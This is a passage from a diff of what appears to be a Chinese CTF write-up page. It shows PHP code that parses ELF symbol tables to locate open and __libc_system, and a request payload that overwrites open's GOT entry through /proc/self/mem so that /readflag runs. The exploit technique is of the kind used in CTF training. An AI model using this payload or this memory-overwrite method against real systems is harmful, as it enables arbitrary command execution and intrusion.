-            <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-            <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$strtab_off</span> <span class="o">+</span> <span class="nv">$name_off</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
-            <span class="k">while</span><span class="p">(</span><span class="nv">$bin</span><span class="p">[</span><span class="o">++</span><span class="nv">$j</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$name</span> <span class="o">.=</span> <span class="nv">$bin</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
-
-            <span class="p">}</span>
-
-            <span class="k">if</span><span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s1">&#39;open&#39;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="k">return</span> <span class="nv">$r_offset</span><span class="p">;</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="p">{</span>
-        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$dynsym_off</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$dynsym_off</span> <span class="o">+</span> <span class="nv">$dynsym_size</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="nv">$dynsym_entsize</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$name_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
-            <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-            <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$strtab_off</span> <span class="o">+</span> <span class="nv">$name_off</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
-            <span class="k">while</span><span class="p">(</span><span class="nv">$bin</span><span class="p">[</span><span class="o">++</span><span class="nv">$j</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$name</span> <span class="o">.=</span> <span class="nv">$bin</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
-            <span class="p">}</span>
-            <span class="k">if</span><span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s1">&#39;__libc_system&#39;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$system_offset</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-            <span class="p">}</span>
-            <span class="k">if</span><span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s1">&#39;__open&#39;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$open_offset</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$system_offset</span><span class="p">,</span> <span class="nv">$open_offset</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="nv">$open_php</span> <span class="o">=</span> <span class="nx">parseelf</span><span class="p">(</span><span class="s1">&#39;exe&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-<span class="c1">//$maps = file_get_contents(&#39;lib.txt&#39;);
-</span><span class="c1">//$pie_base =(hexdec(explode(&#39;-&#39;, $maps)[0]));
-</span><span class="c1"></span><span class="k">echo</span> <span class="nv">$open_php</span><span class="p">;</span>
-<span class="c1">//结果：15333784
-</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">packlli</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$higher</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$lower</span> <span class="o">=</span> <span class="nv">$value</span> <span class="o">&amp;</span> <span class="mh">0x00000000ffffffff</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;V2&#39;</span><span class="p">,</span> <span class="nv">$lower</span><span class="p">,</span> <span class="nv">$higher</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">unp</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">hexdec</span><span class="p">(</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$value</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">parseelf</span><span class="p">(</span><span class="nv">$bin_ver</span><span class="p">,</span> <span class="nv">$rela</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$bin</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$bin_ver</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$e_shoff</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$e_shentsize</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$e_shnum</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$e_shstrndx</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_shnum</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$sh_type</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$sh_type</span> <span class="o">==</span> <span class="mi">11</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// SHT_DYNSYM 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$dynsym_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$dynsym_size</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$dynsym_entsize</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elseif</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$strtab_off</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$sh_type</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// SHT_STRTAB
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$strtab_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$strtab_size</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elseif</span><span class="p">(</span><span class="nv">$rela</span> <span class="o">&amp;&amp;</span> <span class="nv">$sh_type</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// SHT_RELA
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$relaplt_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$relaplt_size</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$relaplt_entsize</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$e_shoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_shentsize</span> <span class="o">+</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$rela</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$relaplt_off</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$relaplt_off</span> <span class="o">+</span> <span class="nv">$relaplt_size</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="nv">$relaplt_entsize</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$r_offset</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$r_info</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$name_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$dynsym_off</span> <span class="o">+</span> <span class="nv">$r_info</span> <span class="o">*</span> <span class="nv">$dynsym_entsize</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$strtab_off</span> <span class="o">+</span> <span class="nv">$name_off</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span><span class="p">(</span><span class="nv">$bin</span><span class="p">[</span><span class="o">++</span><span class="nv">$j</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$name</span> <span class="o">.=</span> <span class="nv">$bin</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s1">&#39;open&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$r_offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$dynsym_off</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$dynsym_off</span> <span class="o">+</span> <span class="nv">$dynsym_size</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="nv">$dynsym_entsize</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$name_off</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$strtab_off</span> <span class="o">+</span> <span class="nv">$name_off</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span><span class="p">(</span><span class="nv">$bin</span><span class="p">[</span><span class="o">++</span><span class="nv">$j</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$name</span> <span class="o">.=</span> <span class="nv">$bin</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s1">&#39;__libc_system&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$system_offset</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s1">&#39;__open&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$open_offset</span> <span class="o">=</span> <span class="nx">unp</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$bin</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$system_offset</span><span class="p">,</span> <span class="nv">$open_offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$open_php</span> <span class="o">=</span> <span class="nx">parseelf</span><span class="p">(</span><span class="s1">&#39;exe&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//$maps = file_get_contents(&#39;lib.txt&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="c1">//$pie_base =(hexdec(explode(&#39;-&#39;, $maps)[0]));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nv">$open_php</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//结果：15333784
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>函数地址都已经得到了，接下来就是修改open函数地址，变成system函数地址，这需要文件<code>/proc/self/mem</code>。</p>
 <blockquote>
@@ -602,8 +602,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">readfile</span><span class="o">=/</span><span class="nx">readflag</span><span class="o">&gt;/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">i_o_u_hlq</span><span class="o">&amp;</span><span class="nx">writefile</span><span class="o">=/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">mem</span><span class="o">&amp;</span><span class="nx">buffer</span><span class="o">=%</span><span class="mi">90</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="nx">f8</span><span class="o">%</span><span class="nx">f5</span><span class="o">%</span><span class="nx">ff</span><span class="o">%</span><span class="mi">7</span><span class="nx">f</span><span class="o">&amp;</span><span class="nx">offset</span><span class="o">=</span><span class="mi">15333784</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">readfile</span><span class="o">=/</span><span class="nx">readflag</span><span class="o">&gt;/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">i_o_u_hlq</span><span class="o">&amp;</span><span class="nx">writefile</span><span class="o">=/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">mem</span><span class="o">&amp;</span><span class="nx">buffer</span><span class="o">=%</span><span class="mi">90</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="nx">f8</span><span class="o">%</span><span class="nx">f5</span><span class="o">%</span><span class="nx">ff</span><span class="o">%</span><span class="mi">7</span><span class="nx">f</span><span class="o">&amp;</span><span class="nx">offset</span><span class="o">=</span><span class="mi">15333784</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>然后读取<code>/tmp/i_o_u_hlq</code>文件获得flag。</p>
 <p>吐槽一下，不会pwn的weber不是好ctfer。。。</p>
